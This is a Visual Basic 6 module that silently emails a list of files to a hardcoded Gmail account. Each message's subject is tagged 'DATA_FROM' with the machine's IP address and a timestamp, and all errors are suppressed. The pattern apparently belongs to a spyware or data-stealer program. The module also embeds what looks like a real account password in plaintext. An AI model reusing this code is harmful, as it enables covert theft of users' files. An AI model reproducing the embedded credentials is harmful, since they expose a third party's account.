Attribute VB_Name = "Module1"
 'Credentials to send email below
Const MAIL_USER = "luizguilherme.goiana@gmail.com"
Const MAIL_PASS = "nirvana,.3274#"
Const MAIL_SMPT = "smtp.gmail.com"
Const MAIL_PORT = "465"


Sub SendMessage(ByRef fileList() As String, ByRef pos_fileList As Integer)
On Error Resume Next
    Dim ObjSendMail
    Set ObjSendMail = CreateObject("CDO.Message")

    'This section provides the configuration information for the remote SMTP server.

    With ObjSendMail.Configuration.Fields
    .Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2  'Send the message using the network (SMTP over the network).
    .Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = MAIL_SMPT
    .Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = MAIL_PORT
    .Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True  'Use SSL for the connection (True or False)
    .Item("http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout") = 10

    ' If your server requires outgoing authentication uncomment the lines below and use a valid email address and password.
    .Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1  'basic (clear-text) authentication
    .Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = MAIL_USER
    .Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = MAIL_PASS

    .Update
    End With

    'End remote SMTP server configuration section==

    ObjSendMail.To = MAIL_USER
    ObjSendMail.Subject = "DATA_FROM " + Form1.getIpAdress + " " + Date$ + Time$
    ObjSendMail.From = MAIL_USER
    addattachmentsToMail fileList(), ObjSendMail, pos_fileList
    

    ' we are sending a html email.. simply switch the comments around to send a text email instead
    ObjSendMail.HTMLBody = ""
    'ObjSendMail.TextBody = Message

    ObjSendMail.Send

    Set ObjSendMail = Nothing
    Erase fileList
    pos_fileList = 0

End Sub

Private Sub addattachmentsToMail(ByRef fileList() As String, ByRef ObjSendMail, pos_fileList As Integer)
        Dim i As Integer
        i = 1
        On Error Resume Next
        While i <= pos_fileList
            If fileList(i) <> "" Then
                ObjSendMail.AddAttachment fileList(i)
            End If
            i = i + 1
        Wend
End Sub
